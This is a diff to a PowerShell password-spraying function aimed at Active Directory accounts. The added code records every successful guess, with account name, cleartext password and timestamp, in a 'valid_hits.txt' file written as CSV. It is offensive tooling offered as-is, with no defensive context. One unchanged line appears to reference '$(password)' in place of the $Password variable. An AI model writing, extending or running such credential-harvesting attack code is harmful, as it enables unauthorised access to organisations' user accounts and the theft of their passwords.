@@ -20,6 +20,21 @@ function PasswordSpray {
         if ($null -eq $Value) { return $null }
         try { [TimeSpan]::FromTicks([int64]$Value).Duration() } catch { $null }
     }
+	
+	
+	    $hitsCsv = Join-Path $PWD "valid_hits.txt"
+   
+		if (-not (Test-Path $hitsCsv)) {
+			[pscustomobject]@{
+				SamAccountName = ''
+				Password       = ''
+				TimeUTC        = [datetime]::UtcNow
+			} | Select-Object SamAccountName,Password,TimeUTC |
+				Export-Csv -Path $hitsCsv -NoTypeInformation
+
+			(Get-Content $hitsCsv | Select-Object -Skip 1) | Set-Content $hitsCsv
+		}
+	
 
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 
@@ -162,6 +177,11 @@ function PasswordSpray {
 
         if ($ok) {
             Write-Host "[+] Great! $($u.SamAccountName) :  $(password)" -ForegroundColor Green
+			[pscustomobject]@{
+                SamAccountName = $u.SamAccountName
+                Password       = $Password
+                TimeUTC        = (Get-Date).ToUniversalTime()
+            } | Export-Csv -Path $hitsCsv -NoTypeInformation -Append
         
         } else {
             Write-Host "[-] Oh No.. User Account $($u.SamAccountName) is sad :( " -ForegroundColor DarkRed
